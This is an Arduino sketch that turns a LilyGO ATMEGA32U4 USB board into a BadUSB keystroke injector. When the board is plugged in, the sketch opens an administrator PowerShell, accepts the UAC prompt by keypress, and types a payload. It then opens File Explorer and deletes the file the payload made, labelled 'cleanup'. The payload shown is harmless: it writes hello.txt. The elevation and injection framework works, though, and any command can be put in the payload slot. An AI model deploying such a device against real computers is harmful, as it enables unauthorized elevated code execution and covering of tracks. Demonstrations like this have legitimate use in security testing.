// Example of using Lily GO USB Microcontroller ATMEGA32U4 as a BadUSB to deliver a payload via PowerShell
//
// Purchase Link: https://www.aliexpress.com/item/4000613433474.html
//
// Board: Arduino Leonardo
//
// Keyboard Reference: https://www.arduino.cc/reference/en/language/functions/usb/keyboard/
// Keyboard Modifiers: https://www.arduino.cc/reference/en/language/functions/usb/keyboard/keyboardmodifiers/
// Mouse Reference: https://www.arduino.cc/reference/en/language/functions/usb/mouse/

#include <Keyboard.h>
#include <Mouse.h>

// Define long and short delay values. The values dlong/500 and dshort/50 are for a fairly
// responsive pc and should be increased if used against a slower machine.
const int dlong = 500;
const int dshort = 50;

// This is the payload PowerShell will execute
const char payload[] = "Set-Content -Path \"C:\\hello.txt\" -Value \"hello, world!\" -Force";

void setup() {
  // INIT
  Keyboard.begin();
  delay(dlong);

  // PHASE 1: Delivery
  
  // Open PowerShell as Administrator
  Keyboard.write(KEY_LEFT_GUI);
  delay(dlong);
  Keyboard.print("powershell");
  delay(dlong);
  Keyboard.write(KEY_RIGHT_ARROW);
  delay(dshort);
  Keyboard.write(KEY_DOWN_ARROW);
  delay(dshort);
  Keyboard.write(KEY_RETURN);
  delay(dlong);

  // Bypass UAC
  Keyboard.write(KEY_LEFT_ARROW);
  delay(dshort);
  Keyboard.write(KEY_RETURN);
  delay(dlong);

  // Deliver payload
  Keyboard.println(payload); 
  delay(dshort);

  // Close PowerShell
  Keyboard.println("exit");
  
  // END PHASE 1

  // Pause between phases
  delay(dlong*2);

  // PHASE 2: Cleanup
  
  // Open File Explorer to C drive
  Keyboard.write(KEY_LEFT_GUI);
  delay(dlong);
  Keyboard.print("C:\\");
  delay(dshort);
  Keyboard.write(KEY_RETURN);
  delay(dlong);

  // Select and delete file
  Keyboard.write(KEY_DOWN_ARROW);
  delay(dshort);
  Keyboard.print("hello.txt");
  delay(dshort);
  Keyboard.write(KEY_DELETE);
  delay(dlong);
  Keyboard.write(KEY_RETURN);
  delay(dlong*4);

  // Close File Explorer
  Keyboard.press(KEY_LEFT_ALT);
  Keyboard.press(KEY_F4);
  delay(dshort);
  Keyboard.releaseAll();
  
  // END PHASE 2
}

void loop() {

}
